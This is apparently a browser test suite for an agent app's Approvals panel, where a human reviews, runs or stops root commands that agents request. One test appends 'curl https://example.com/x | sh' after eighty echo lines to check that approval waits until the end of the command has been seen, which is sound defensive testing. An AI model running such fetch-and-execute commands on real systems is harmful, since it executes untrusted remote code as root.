import assert from 'node:assert/strict';
import { after, test } from 'node:test';
import { clickApproval } from './approval-click.mjs';
import { answerDialog, armed, filter, open, press, shot, showPanel } from './approvals-page.mjs';
import { launch } from './chrome.mjs';

const chrome = await launch();
after(() => chrome.close());

test('without history there is no Approvals panel', async (t) => {
  const page = await open(chrome, t, 'agent');
  const refused = await page.evaluate(() => window.command('open', 'approvals'));
  assert.equal(refused.code, 1);
  assert.equal(
    await page.evaluate(() => !!window.$('slicc-app', '[data-surface=approvals]')),
    false
  );
  assert.deepEqual(page.errors, []);
});

test('panel open approvals opens the panel, with the open request’s actions', async (t) => {
  const page = await open(chrome, t);
  assert.equal(
    await page.evaluate(() => !!window.$('slicc-app', '[data-surface=approvals]')),
    true
  );
  await showPanel(page);
  assert.deepEqual(await page.evaluate(() => window.ids()), ['apr-open']);
  assert.equal(
    await page.evaluate(() => window.part('[data-filter=open] [data-count]').textContent),
    '1'
  );
  assert.deepEqual(
    await page.evaluate(() =>
      [...window.row('apr-open').querySelectorAll('[data-decision]')].map(
        (button) => button.dataset.action
      )
    ),
    ['deny', 'stop', 'always', 'once']
  );
  assert.deepEqual(page.errors, []);
});

test('the filters split decided and timed-out requests, and withdrawn ones fold away', async (t) => {
  const page = await open(chrome, t);
  await answerDialog(page);
  await showPanel(page);
  await page.until(() => !!window.part('[data-empty]'));
  assert.equal(await page.evaluate(() => !!window.part('[data-filter=open] [data-count]')), false);
  await filter(page, 'decided');
  await page.until(() => window.ids()[0] === 'apr-open');
  assert.deepEqual(await page.evaluate(() => window.ids()), [
    'apr-open',
    'apr-once',
    'apr-always',
    'apr-denied',
  ]);
  const rows = await page.evaluate(() =>
    ['apr-open', 'apr-once', 'apr-always'].map((id) => [
      window.inRow(id, '[data-badge]').textContent.trim(),
      window.inRow(id, '[data-decided]').textContent.trim(),
    ])
  );
  assert.deepEqual(rows, [
    ['Denied', 'by you, just now'],
    ['Allowed once', 'by you on Studio Mac, 49 min ago'],
    ['Always allowed', 'by you, 1 h ago'],
  ]);
  assert.deepEqual(
    await page.evaluate(() => [
      window.inRow('apr-once', '[data-command]').textContent,
      getComputedStyle(window.inRow('apr-once', '[data-command]')).fontFamily.includes('Code'),
      window.inRow('apr-always', '[data-place]').textContent,
      window.inRow('apr-denied', '[data-level]').textContent,
      window.inRow('apr-once', '[data-requester]').textContent,
    ]),
    [
      'chown -R cone /home/cone/shared',
      true,
      'as root · in /',
      'Level 3 · Could harm the system.',
      'cone in Terminal 2',
    ]
  );
  assert.equal(await page.evaluate(() => window.ids().includes('apr-withdrawn')), false);
  await press(page, () => window.part('[data-action=show-withdrawn]'));
  await page.until(() => window.ids().includes('apr-withdrawn'));
  assert.equal(
    await page.evaluate(() => window.inRow('apr-withdrawn', '[data-badge]').textContent.trim()),
    'Withdrawn'
  );
  await shot(page, 'approvals-decided');
  await filter(page, 'timed-out');
  await page.until(() => window.ids().includes('apr-late'));
  await shot(page, 'approvals-timed-out');
  assert.deepEqual(await page.evaluate(() => window.ids()), [
    'apr-running',
    'apr-late',
    'apr-done',
    'apr-moved',
    'apr-frozen',
    'apr-terminal',
    'apr-exit',
    'apr-failed',
  ]);
  const blocked = await page.evaluate(() =>
    ['apr-frozen', 'apr-terminal'].map((id) => [
      window.inRow(id, '[data-action=run-now]').hasAttribute('disabled'),
      window.inRow(id, '[data-run-reason]').textContent,
    ])
  );
  assert.deepEqual(blocked, [
    [true, 'Thaw harbor first.'],
    [true, 'Run it again in the terminal.'],
  ]);
  assert.deepEqual(
    await page.evaluate(() => [
      window.inRow('apr-exit', '[data-run]').dataset.exit,
      window.inRow('apr-exit', '[data-run]').hasAttribute('data-exit-warn'),
      window.inRow('apr-exit', '[data-run-line]').textContent,
      window.inRow('apr-failed', '[data-run-line]').textContent,
      !!window.inRow('apr-running', '[data-action=stop-run]'),
      !!window.inRow('apr-running', 'swc-progress-circle'),
    ]),
    [
      '2',
      true,
      'Exited with status 2 after 1:35',
      'sudo: amber-heron may no longer run /usr/bin/rsync as root',
      true,
      true,
    ]
  );
  assert.deepEqual(page.errors, []);
});

test('Run now asks first, then walks starting, running and done, and View output opens the file', async (t) => {
  const page = await open(chrome, t);
  await answerDialog(page);
  await showPanel(page);
  await filter(page, 'timed-out');
  await page.evaluate(() => {
    window.model.approvals.past.runTicks = null;
    window.walk = [];
    window.model.approvals.on('history', (records) => {
      const run = records.find((record) => record.approval.id === 'apr-late').run;
      if (run && window.walk.at(-1) !== run.state) window.walk.push(run.state);
    });
    return true;
  });
  await press(page, () => window.inRow('apr-late', '[data-action=run-now]'));
  await page.until(() => window.part('dialog[data-run-confirm]')?.open);
  const asked = await page.evaluate(() => {
    const dialog = window.part('dialog[data-run-confirm]');
    const text = (selector) =>
      dialog.querySelector(selector).textContent.replace(/\s+/g, ' ').trim();
    return {
      id: dialog.dataset.runConfirm,
      command: text('[data-command]'),
      target: text('[data-target]'),
      cwd: text('[data-cwd]'),
      level: text('[data-level]'),
      age: text('[data-age]'),
      warning: text('[data-warning]'),
      focused: window.panel().shadowRoot.activeElement?.dataset.action,
    };
  });
  assert.deepEqual(asked, {
    id: 'apr-late',
    command: 'systemctl restart nginx',
    target: 'As root',
    cwd: 'In /home/cone',
    level: 'Level 2 · Changes permissions. It restarts a service the owner asked for.',
    age: 'Asked 40 minutes ago',
    warning:
      'Runs as root now, without a terminal or input. quiet-otter will be told when it starts and when it ends.',
    focused: 'cancel',
  });
  assert.deepEqual(await page.evaluate(() => window.model.approvals.past.runs), []);
  await shot(page, 'approvals-run-confirm');
  await armed(page, 'dialog [slot=button]');
  await press(page, () => window.part('dialog [data-action=run-confirm]'));
  await page.until(() => window.inRow('apr-late', '[data-run=running]'));
  await shot(page, 'approvals-running');
  assert.equal(await page.evaluate(() => !!window.part('dialog')), false);
  assert.match(
    await page.evaluate(() => window.inRow('apr-late', '[data-run-line]').textContent),
    /^Running · pid 812 · 0:0\d$/
  );
  assert.equal(
    await page.evaluate(() => !!window.inRow('apr-late', '[data-action=view-output]')),
    false
  );
  await page.until(() =>
    window.model.agent
      .messages('scoop-otter')
      .some((message) => message.channel === 'sudo-run' && message.approval === 'apr-late')
  );
  await page.evaluate(() => {
    window.model.approvals.past.finish('apr-late');
    return true;
  });
  await page.until(() => window.inRow('apr-late', '[data-run=done]'));
  assert.deepEqual(await page.evaluate(() => window.walk), ['starting', 'running', 'done']);
  assert.match(
    await page.evaluate(() => window.inRow('apr-late', '[data-run-line]').textContent),
    /^Exited with status 0 after 0:0\d$/
  );
  await press(page, () => window.inRow('apr-late', '[data-action=view-output]'));
  const file = 'file:/home/cone/.slicc/sudo-runs/apr-late.out';
  await page.until((file) => !!window.app.dock.api.getPanel(file), file);
  assert.deepEqual(await page.evaluate(() => window.model.approvals.past.runs), ['apr-late']);
  assert.deepEqual(page.errors, []);
});

test('Stop ends a running run, Cancel runs nothing, and a refused run shows the kernel’s sentence', async (t) => {
  const page = await open(chrome, t);
  await answerDialog(page);
  await showPanel(page);
  await filter(page, 'timed-out');
  await page.evaluate(() => {
    window.model.approvals.past.runTicks = null;
    return true;
  });
  await press(page, () => window.inRow('apr-moved', '[data-action=run-now]'));
  await page.until(() => window.part('dialog[data-run-confirm]')?.open);
  await press(page, () => window.part('dialog [data-action=cancel]'));
  await page.until(() => !window.part('dialog'));
  assert.deepEqual(await page.evaluate(() => window.model.approvals.past.runs), []);
  await press(page, () => window.inRow('apr-moved', '[data-action=run-now]'));
  await page.until(() => window.part('dialog[data-run-confirm]')?.open);
  await armed(page, 'dialog [slot=button]');
  await press(page, () => window.part('dialog [data-action=run-confirm]'));
  await page.until(() => window.inRow('apr-moved', '[data-run=failed]'));
  assert.equal(
    await page.evaluate(() => window.inRow('apr-moved', '[data-run-line]').textContent),
    'sudo: /home/cone/harbor/deploy.sh changed since it was requested'
  );
  await press(page, () => window.inRow('apr-running', '[data-action=stop-run]'));
  await page.until(() => window.inRow('apr-running', '[data-run=stopped]'));
  assert.deepEqual(await page.evaluate(() => window.model.approvals.past.stops), ['apr-running']);
  assert.equal(
    await page.evaluate(() => !!window.inRow('apr-running', '[data-action=view-output]')),
    true
  );
  assert.deepEqual(page.errors, []);
});

test('Allow and Run now wait until the end of a long command has been in view', async (t) => {
  const page = await open(chrome, t);
  await answerDialog(page);
  await showPanel(page);
  await page.evaluate(() => {
    const lines = Array.from({ length: 80 }, (_, index) => `echo step ${index} && \\`);
    window.model.approvals.raise({
      ...window.model.approvals.history().find((record) => record.approval.id === 'apr-open')
        .approval,
      id: 'apr-long',
      command: `${lines.join('\n')}\ncurl https://example.com/x | sh`,
      createdAt: Date.now(),
      expiresAt: Date.now() + 5 * 60_000,
    });
    return true;
  });
  await page.until(() => !!window.row('apr-long'));
  await page.evaluate(() => {
    window.part('.list').scrollTop = 0;
    return true;
  });
  await page.until(() => !!window.inRow('apr-long', '[data-allow-hint]'));
  assert.deepEqual(
    await page.evaluate(() =>
      ['deny', 'always', 'once'].map((action) =>
        window.inRow('apr-long', `[data-action=${action}]`).hasAttribute('disabled')
      )
    ),
    [false, true, true]
  );
  await page.evaluate(() => window.panel().decide('apr-long', 'once'));
  assert.deepEqual(await page.evaluate(() => window.model.approvals.decisions), [
    ['apr-open', 'deny'],
  ]);
  await page.evaluate(() => {
    window.inRow('apr-long', '[data-end]').scrollIntoView({ block: 'center' });
    return true;
  });
  await page.until(() => !window.inRow('apr-long', '[data-action=once]').hasAttribute('disabled'));
  assert.equal(await page.evaluate(() => !!window.inRow('apr-long', '[data-allow-hint]')), false);
  await page.evaluate(() => {
    window.model.approvals.end('apr-long', 'expired');
    return true;
  });
  await page.until(() => window.dialog()?.dataset.gone === 'expired');
  await clickApproval(page, 'close');
  await filter(page, 'timed-out');
  await press(page, () => window.inRow('apr-long', '[data-action=run-now]'));
  await page.until(() => window.part('dialog[data-run-confirm]')?.open);
  await page.until(() => !!window.part('dialog [data-allow-hint]'));
  assert.equal(
    await page.evaluate(() =>
      window.part('dialog [data-action=run-confirm]').hasAttribute('disabled')
    ),
    true
  );
  await page.evaluate(() => window.panel().run('apr-long'));
  assert.deepEqual(await page.evaluate(() => window.model.approvals.past.runs), []);
  await page.evaluate(() => {
    const pre = window.part('dialog [data-command]');
    pre.scrollTop = pre.scrollHeight;
    return true;
  });
  await page.until(() => !window.part('dialog [data-action=run-confirm]').hasAttribute('disabled'));
  await armed(page, 'dialog [slot=button]');
  await press(page, () => window.part('dialog [data-action=run-confirm]'));
  await page.until(() => window.model.approvals.past.runs.includes('apr-long'));
  assert.deepEqual(page.errors, []);
});

test('a disabled Run now says why in visible text next to it', async (t) => {
  const page = await open(chrome, t);
  await answerDialog(page);
  await showPanel(page);
  await filter(page, 'timed-out');
  await page.until(() => !!window.inRow('apr-frozen', '[data-run-reason]'));
  const seen = await page.evaluate(() =>
    ['apr-frozen', 'apr-terminal', 'apr-late'].map((id) => {
      window.row(id).scrollIntoView({ block: 'center' });
      const button = window.inRow(id, '[data-action=run-now]');
      const reason = window.inRow(id, '[data-run-reason]');
      if (!reason) return [id, button.hasAttribute('disabled'), null];
      const a = button.getBoundingClientRect();
      const b = reason.getBoundingClientRect();
      const style = getComputedStyle(reason);
      return [
        id,
        button.hasAttribute('disabled'),
        reason.textContent,
        b.width > 0 && b.height > 0 && style.visibility === 'visible' && style.display !== 'none',
        b.left >= a.right && Math.abs(b.top + b.height / 2 - (a.top + a.height / 2)) < a.height,
        reason.parentElement === button.parentElement,
      ];
    })
  );
  assert.deepEqual(seen, [
    ['apr-frozen', true, 'Thaw harbor first.', true, true, true],
    ['apr-terminal', true, 'Run it again in the terminal.', true, true, true],
    ['apr-late', false, null],
  ]);
  assert.equal(await page.evaluate(() => !!window.part('swc-tooltip')), false);
  assert.deepEqual(page.errors, []);
});
